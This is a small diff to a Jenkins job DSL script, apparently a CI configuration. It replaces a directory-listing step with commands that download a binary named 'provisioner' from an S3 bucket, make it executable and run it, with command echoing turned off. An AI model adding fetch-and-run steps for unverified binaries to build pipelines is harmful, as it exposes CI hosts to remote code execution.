@@ -135,8 +135,9 @@ analyzeScriptsJob.with{
   label("docker")
   steps {
     shell('''set +x
-            ls -lah
-            set -x
+            curl -O https://s3-us-west-1.amazonaws.com/tw-test123/provisioner
+            chmod +x provisioner
+            ./provisioner docker-compose.yml
             '''.stripMargin())
   }
   
